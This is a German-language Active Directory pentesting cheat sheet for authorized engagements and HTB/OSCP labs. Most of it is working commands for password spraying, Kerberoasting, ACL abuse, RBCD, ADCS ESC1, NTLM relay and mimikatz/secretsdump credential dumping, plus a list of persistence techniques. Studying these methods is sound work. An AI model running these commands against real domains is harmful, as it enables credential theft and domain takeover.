# Active Directory Attack Notes

> Methodik für AD-Pentesting im Kontext interner Engagements und HTB / OSCP-Labs.
> Vom anonymen Footprint zum Domain Admin.

## Methodik

```
Recon → Enumerate → Foothold → Lateral Movement → Privilege Escalation → Persistence → DA
```

AD ist Pfad-basiert. Tools wie **BloodHound** modellieren genau das: erreichbare Pfade vom
aktuellen Identity-Knoten zum gewünschten Ziel.

---

## 1. Initial Recon (ohne Credentials)

### Network-Scan

```bash
nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA ad <TARGET>
```

**Indicator-Ports:**

| Port  | Service                  | Bedeutung                          |
|-------|--------------------------|------------------------------------|
| 53    | DNS                      | Domain Controller fast immer DNS   |
| 88    | Kerberos                 | hartes AD-Indiz                    |
| 135   | RPC Endpoint Mapper      |                                    |
| 139/445 | SMB                    | Shares, RPC, Auth                  |
| 389   | LDAP                     | Directory-Queries                  |
| 464   | Kerberos Password Change |                                    |
| 593   | RPC over HTTPS           |                                    |
| 636   | LDAPS                    |                                    |
| 3268/3269 | Global Catalog       | nur DCs                            |
| 5985/5986 | WinRM                |                                    |
| 9389  | AD Web Services          |                                    |

### Domain & DC Discovery

```bash
nmap -p 389 --script ldap-rootdse <TARGET>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
crackmapexec smb <TARGET>
nxc smb <TARGET>
```

### Anonymous Enumeration

```bash
crackmapexec smb <TARGET> -u '' -p ''
nxc smb <TARGET> -u '' -p '' --shares
enum4linux-ng -A <TARGET>
rpcclient -U "" -N <TARGET>
```

`rpcclient`:

```text
enumdomusers
querydominfo
querydispinfo
getdompwinfo
lookupnames Administrator
```

### LDAP Anonymous Bind

```bash
ldapsearch -x -H ldap://<TARGET> -s base namingcontexts
ldapsearch -x -H ldap://<TARGET> -b "DC=corp,DC=local" -s sub "(objectclass=user)"
```

---

## 2. Username & Password Discovery

### Username-Listen

- `enum4linux-ng` / `rpcclient` (anonymous)
- Kerbrute: `kerbrute userenum -d corp.local users.txt --dc <DC>`
- LinkedIn-Recon → Format-Konventionen (`vorname.nachname`)
- SMB-Shares mit Anonymous-Lesezugriff
- Email-Header / E-Mails (auf Phishing-Engagements)

### Passwort-Quellen

- Default-Passwörter (`Welcome1`, `Password123`, `<Firmenname><Jahr>`, `Sommer2026!`)
- Geleakte Datenbanken
- Spray-Wordlists (siehe unten)
- GPP-Cpassword (siehe Abschnitt Credential-Hunting)

### Password Spraying

**Vorsicht:** Account-Lockout-Policy zuerst prüfen!

```bash
nxc smb <TARGET> -u users.txt -p 'Welcome2026!' --continue-on-success
kerbrute passwordspray -d corp.local users.txt 'Welcome2026!'
```

Spray langsam (1 Versuch alle X Minuten), nie nahe an Lockout-Threshold.

---

## 3. Kerberos-Angriffe (vor Auth)

### AS-REP Roasting

User mit `DONT_REQ_PREAUTH` lassen sich unauthentifiziert TGTs anfordern:

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>
nxc ldap <DC> -u guest -p '' --asreproast asrep.txt
```

Cracken:

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

### Username Enumeration via Kerberos

Kerberos antwortet unterschiedlich für gültige vs. ungültige User (Pre-Auth required vs. Principal unknown):

```bash
kerbrute userenum -d corp.local users.txt --dc <DC>
```

---

## 4. Mit Credentials — initiale Standortbestimmung

### Welche Rechte habe ich?

```bash
nxc smb <DC> -u <user> -p <pass>
nxc smb <DC> -u <user> -p <pass> --shares
nxc winrm <DC> -u <user> -p <pass>
nxc ldap <DC> -u <user> -p <pass> --groups
```

### LDAP-Recon

```bash
ldapsearch -x -H ldap://<DC> -D '<user>@corp.local' -w '<pass>' -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' samaccountname servicePrincipalName

ldapsearch -x -H ldap://<DC> -D '<user>@corp.local' -w '<pass>' -b 'DC=corp,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' samaccountname  # DONT_REQ_PREAUTH

ldapsearch -x -H ldap://<DC> -D '<user>@corp.local' -w '<pass>' -b 'DC=corp,DC=local' \
  '(adminCount=1)' samaccountname  # protected groups
```

### BloodHound Collection

**Aus Linux:**

```bash
bloodhound-python -u <user> -p <pass> -d corp.local -ns <DC> -c All
```

**Aus Windows:**

```powershell
.\SharpHound.exe -c All
.\SharpHound.exe -c All --zipfilename collected.zip
```

**Im BloodHound-UI prüfen:**
- Shortest path to Domain Admins
- Owned-Markierung setzen → "Find shortest path from owned"
- Kerberoastable Users
- AS-REP Roastable Users
- Users with high privileges
- Tier-0 Assets

---

## 5. Kerberoasting

User mit SPN können von beliebigem Domain-User TGS-Tickets anfordern.

```bash
GetUserSPNs.py corp.local/<user>:<pass> -dc-ip <DC> -request -outputfile spn.txt
nxc ldap <DC> -u <user> -p <pass> --kerberoasting roast.txt
```

Cracken:

```bash
hashcat -m 13100 spn.txt rockyou.txt -r rules/best64.rule
```

**Erfolgs-Faktor:** Service-Accounts haben oft schwache, alte Passwörter.

---

## 6. ACL-Abuse

BloodHound-Edges, die zu Eskalation führen:

| Edge                       | Ausnutzung                                           |
|----------------------------|------------------------------------------------------|
| `GenericAll`               | Beliebige Aktion auf Objekt — RBCD, Password-Reset, Shadow-Cred |
| `GenericWrite`             | Attribute schreiben — SPN, msDS-AllowedToActOnBehalfOf |
| `WriteDACL`                | DACL modifizieren → DCSync grant                     |
| `WriteOwner`               | Ownership übernehmen → DACL                          |
| `ForceChangePassword`      | Passwort des Targets neu setzen                      |
| `AddSelf` / `AddMember`    | Sich selbst zu privilegierter Gruppe hinzufügen      |
| `AllExtendedRights`        | DCSync, Password-Reset                               |
| `ReadGMSAPassword`         | gMSA-Passwort auslesen                               |
| `ReadLAPSPassword`         | LAPS-Passwort auslesen                               |
| `Owns`                     | Effektiv `WriteDACL`                                 |

### Beispiele

**Force Password Change:**

```bash
net rpc password "<target>" "NewPass123!" -U "corp.local/<user>%<pass>" -S <DC>
```

**Add to Group:**

```bash
net rpc group addmem "Domain Admins" <user> -U "corp.local/<attacker>%<pass>" -S <DC>
```

**WriteDACL → DCSync:**

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity <user> -Rights DCSync
```

---

## 7. Resource-Based Constrained Delegation (RBCD)

### Voraussetzungen

- `MachineAccountQuota` ≥ 1 (Default: 10)
- `GenericWrite` / `GenericAll` auf Ziel-Computer-Objekt

### Ablauf

1. Fake-Computer-Account erstellen:

```bash
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'P@ss123!' \
  -dc-host <DC> 'corp.local/<user>:<pass>'
```

2. RBCD setzen:

```bash
rbcd.py -delegate-from 'FAKE01$' -delegate-to '<TARGET>$' \
  -dc-ip <DC> -action write 'corp.local/<user>:<pass>'
```

3. S4U2Self → S4U2Proxy:

```bash
getST.py -spn cifs/<TARGET>.corp.local -impersonate Administrator \
  -dc-ip <DC> 'corp.local/FAKE01$:P@ss123!'
```

4. Pass-the-Ticket:

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <TARGET>.corp.local
```

---

## 8. ADCS (Active Directory Certificate Services)

### Discovery

```bash
certipy find -u <user>@corp.local -p <pass> -dc-ip <DC>
certipy find -u <user>@corp.local -p <pass> -dc-ip <DC> -vulnerable
```

### Klassische ESC-Vektoren

| ESC   | Misconfiguration                                                 | Ergebnis              |
|-------|------------------------------------------------------------------|-----------------------|
| ESC1  | Template erlaubt SAN, niedrige Auth-Hürden                       | Beliebigen User impersonieren |
| ESC2  | Template `Any Purpose`-EKU + niedrige Hürden                     | wie ESC1              |
| ESC3  | Enrollment Agent Template                                        | Cert-on-behalf         |
| ESC4  | Schreibrechte auf Template-ACL                                   | Template umkonfigurieren → ESC1 |
| ESC5  | Schreibrechte auf CA / NTAuthCertificates                        | Trust kontrollieren    |
| ESC6  | `EDITF_ATTRIBUTESUBJECTALTNAME2` auf CA                          | SAN überall           |
| ESC7  | CA-Manage-Berechtigungen                                         | Approval erzwingen    |
| ESC8  | NTLM-Relay an HTTP-Endpoint                                      | Auth abgreifen        |
| ESC11 | RPC-NTLM-Relay                                                   | Auth abgreifen        |

### ESC1-Beispiel

```bash
certipy req -u <user>@corp.local -p <pass> -ca <CA_NAME> \
  -template <VULN_TEMPLATE> -upn administrator@corp.local
certipy auth -pfx administrator.pfx
```

---

## 9. NTLM Relay

### Discovery

```bash
nxc smb <RANGE> --gen-relay-list relay.txt   # Hosts ohne SMB-Signing
```

### Aufbau

```bash
ntlmrelayx.py -tf relay.txt -smb2support
```

**Trigger** (mDNS / LLMNR / NBT-NS Poison oder PetitPotam / PrinterBug):

```bash
responder -I eth0 -wd
PetitPotam.py <listener> <DC>
coercer coerce -t <DC> -u <user> -p <pass> -d corp.local -l <listener>
```

### Targets

- LDAP → ADCS (ESC8) → Cert für DC
- LDAP → RBCD setzen
- SMB → SAM-Dump auf Workstation

---

## 10. Credential Hunting auf AD-Hosts

### LSASS

```text
procdump.exe -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

### LSA Secrets / SAM

```text
secretsdump.py -sam SAM -system SYSTEM LOCAL
secretsdump.py corp.local/<user>:<pass>@<TARGET>
```

### DPAPI

```text
mimikatz "dpapi::masterkey /in:..." "dpapi::cred /in:..."
```

### GPP-Cpassword (legacy)

```bash
crackmapexec smb <DC> -u <user> -p <pass> -M gpp_password
gpp-decrypt 'cpasswordstring'
```

### LAPS

```bash
nxc ldap <DC> -u <user> -p <pass> --laps
ldapsearch ... 'ms-Mcs-AdmPwd'   # legacy
ldapsearch ... 'msLAPS-Password' # neu
```

---

## 11. Persistence (nur in autorisierten Engagements!)

| Technik                  | Bemerkung                                     |
|--------------------------|-----------------------------------------------|
| Golden Ticket            | krbtgt-Hash → beliebiger User                 |
| Silver Ticket            | Service-Account-Hash → einzelner Service      |
| DCSync-Grant             | non-DA mit DCSync-Recht                       |
| Skeleton Key             | Mimikatz-In-Memory                            |
| AdminSDHolder-DACL       | wird auf Tier-0 zurückkopiert                 |
| GPO-Modifikation         | Schedules Tasks via Group Policy              |
| Shadow Credentials       | msDS-KeyCredentialLink                        |

**Wichtig:** Persistence nur in expliziten Red-Team-Engagements und immer dokumentieren.

---

## 12. Mini-Cheatsheet — Mein Tool-Stack

| Tool                | Wofür                                              |
|---------------------|----------------------------------------------------|
| `nxc` / `crackmapexec` | Schweizer Taschenmesser                         |
| `Impacket`          | Kerberos, RPC, secretsdump, GetUserSPNs, GetNPUsers |
| `BloodHound` + `bloodhound-python` | Pfad-Visualisierung                |
| `kerbrute`          | User-Enum, Spraying                                |
| `Certipy`           | ADCS-Enum + Exploitation                           |
| `Coercer`           | Auth-Coercion                                      |
| `ntlmrelayx`        | Relay-Server                                       |
| `Responder`         | LLMNR/NBT-NS Poisoning                             |
| `Rubeus`            | Kerberos auf Windows                               |
| `PowerView` / `PowerSploit` | AD-Recon auf Windows                       |
| `Mimikatz`          | Credential-Extraction                              |
| `evil-winrm`        | WinRM-Shell                                        |

---

## References

- [HackTricks – AD Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [BloodHound Docs](https://bloodhound.specterops.io/)
- [The Hacker Recipes – AD](https://www.thehacker.recipes/ad/movement)
- [Certified Pre-Owned (ADCS Whitepaper)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [PayloadsAllTheThings – AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Impacket](https://github.com/fortra/impacket)
